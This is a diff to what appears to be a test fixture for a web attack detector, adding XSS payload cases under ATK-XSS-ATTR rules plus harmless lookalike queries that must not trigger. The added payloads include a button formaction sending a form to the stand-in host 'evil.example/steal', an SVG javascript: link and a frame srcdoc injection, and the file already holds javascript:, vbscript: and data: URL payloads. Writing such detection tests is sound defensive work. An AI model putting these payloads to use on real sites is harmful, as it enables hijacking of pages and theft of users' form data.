@@ -98,6 +98,10 @@ return [
             ['/?q=%3Cobject%20data%3Dx%3E', [], 'ATK-XSS-TAG'],
             ['/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],
             ['/?q=%3Csvg%20onload%3Dalert(1)%3E', [], 'ATK-XSS-EVENT'],
+            ['/?q=%3Cbutton%20formaction%3Dhttps://evil.example/steal%3Ex', [], 'ATK-XSS-ATTR'],     // a button that sends the form elsewhere
+            ['/?q=%3Cinput%20type%3Dsubmit%20formaction%3D//evil.example/%3E', [], 'ATK-XSS-ATTR'],
+            ['/?q=%3Csvg%3E%3Ca%20xlink:href%3D%22javascript:alert(1)%22%3E%3Ctext%3Ex', [], 'ATK-XSS-ATTR'],   // SVG's link
+            ['/?q=%3Cframe%20srcdoc%3D%22x%22%3E', [], 'ATK-XSS-ATTR'],
             ['/?u=javascript:alert(document.domain)', [], 'ATK-XSS-URL'],
             ['/?u=vbscript:msgbox(1)', [], 'ATK-XSS-URL'],
             ['/?u=data:text/html,x', [], 'ATK-XSS-URL'],
@@ -236,6 +240,10 @@ return [
             '/search?q=%7B%7B%20user.name%20%7D%7D', // a placeholder, nothing computed
             '/?q={{ title }} and {{ date }}',
             '/?q={{#each items}}',                   // Handlebars: no call, no *
+            '/?q=a%3Cb&srcdoc=1',                    // "<" in one parameter, the word in another
+            '/?q=x%20%3C%20y%20formaction%3D1',      // "x < y": no tag
+            '/?q=formaction%3Dsave',                 // the word without a tag
+            '/?q=%3Cb%3Eformaction%3D%3C/b%3E',      // the tag closed before it
             '/?d=a:1:{i:0;s:1:"x";}',                // a serialised array: no object in it
             '/?t=10:30:00&o=1',                      // times, a parameter called o
             '/fetch?url=https://www.example.org/feed',   // an ordinary address
